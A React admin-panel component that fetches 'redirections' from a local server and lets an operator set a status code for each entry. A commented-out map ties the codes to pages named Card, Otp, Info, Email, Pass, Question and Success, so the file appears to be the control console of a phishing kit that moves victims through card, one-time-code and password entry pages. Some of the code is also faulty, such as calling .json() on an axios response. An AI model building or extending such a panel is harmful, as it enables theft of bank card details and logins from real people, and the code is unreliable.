import React, { useState, useEffect } from 'react';
import axios from 'axios';

const AdminPanel = () => {
  const [redirections, setRedirections] = useState([]);
  const [token, setToken] = useState(localStorage.getItem('token') || ''); // Get token from localStorage


  const fetchData = async (token) => {
    try {
      const response = await axios.get(`http://localhost:9000/dashboard/redirections`, {
        headers: { Authorization: `Bearer ${token}` }
      });

      setToken(response.data.token)
      setRedirections(response.data)
    } catch (error) {
      console.error('Fecthing data falied', error)
    }
  }

  useEffect(() => {
    //? Fetch redirection statuses with authorization header
    const savedToken = localStorage.getItem('token');
    if(savedToken) {
      setToken(savedToken);
      fetchData(savedToken);
    }
  }, []);

  console.log(redirections);


  const handleSubmit = async (statusCode, id) => {
    
  try {
    
   const response = await axios.post('http://localhost:9000/dashboard/redirections', {
      status_code: statusCode,
      id: id
    },
    {
      headers: { Authorization: `Bearer ${token}`}
    }
  )

    if(response.status !== 200) {
      throw new Error("Error fetching data");      
    }


    return response.json();

  } catch (error) {
    console.error(error.message);
  }
   
  };


  // todo Logout function 
  const handleLogout = () => {
    setToken(null);
    localStorage.removeItem('token');
    window.location.href = '/login'
  }

  return (
    <div>
      <h1>Admin Panel</h1>
      <button onClick={handleLogout}>Logout</button>

      <h2>Redirection Statuses</h2>
      <table border="1">
        <thead>
          <tr>
            {/* <th>User ID</th> */}
            <th>Status Code</th>
            <th>Name</th>
            {/* <th>Redirection Page</th> */}
          </tr>
        </thead>
        <tbody>
          {redirections.map((redirection) => (
            <tr key={redirection.id}>
             <td>{redirection.status_code}</td>
              <td><button onClick={() => handleSubmit(redirection.status_code, redirection.id)}> {redirection.name} </button></td>
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  );
};

// const getRedirectionPage = (statusCode) => {
//   const redirectionMap = {
//     11: '/Card',      // Corresponds to Card.jsx
//     12: '/Otp',       // Corresponds to Otp.jsx
//     3: '/Info',       // Corresponds to Info.jsx
//     2: '/Email',      // Corresponds to Email.jsx
//     4: '/Success',    // Corresponds to Success.jsx
//     5: '/Question',   // Corresponds to Question.jsx
//     7: '/Pass'        // Corresponds to Pass.jsx
//   };
//   return redirectionMap[statusCode] || 'Unknown';
// };

export default AdminPanel;
